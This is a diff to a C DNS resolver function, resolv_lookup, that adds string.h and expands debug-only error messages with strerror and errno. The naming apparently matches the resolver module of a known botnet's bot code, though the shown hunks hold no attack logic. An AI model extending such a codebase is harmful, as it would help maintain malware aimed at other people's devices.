@@ -5,6 +5,7 @@
 #endif
 #include <stdint.h>
 #include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -103,7 +104,7 @@ struct resolv_entries *resolv_lookup(char *domain)
         if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
         {
             #ifdef DEBUG
-                printf("[resolv] Failed to create socket\n");
+                printf("[resolv] Failed to create socket: %s (errno: %d)\n", strerror(errno), errno);
             #endif
             sleep(1);
             continue;
@@ -112,7 +113,7 @@ struct resolv_entries *resolv_lookup(char *domain)
         if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
         {
             #ifdef DEBUG
-                printf("[resolv] Failed to call connect on udp socket\n");
+                printf("[resolv] Failed to call connect on udp socket: %s (errno: %d)\n", strerror(errno), errno);
             #endif
             sleep(1);
             continue;
@@ -121,7 +122,7 @@ struct resolv_entries *resolv_lookup(char *domain)
         if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
         {
             #ifdef DEBUG
-                printf("[resolv] Failed to send packet: %d\n", errno);
+                printf("[resolv] Failed to send packet: %s (errno: %d)\n", strerror(errno), errno);
             #endif
             sleep(1);
             continue;
@@ -138,14 +139,14 @@ struct resolv_entries *resolv_lookup(char *domain)
         if (nfds == -1)
         {
             #ifdef DEBUG
-                printf("[resolv] select() failed\n");
+                printf("[resolv] select() failed: %s (errno: %d)\n", strerror(errno), errno);
             #endif
             break;
         }
         else if (nfds == 0)
         {
             #ifdef DEBUG
-                printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
+                printf("[resolv] Couldn't resolve %s in time (timeout). %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
             #endif
             continue;
         }
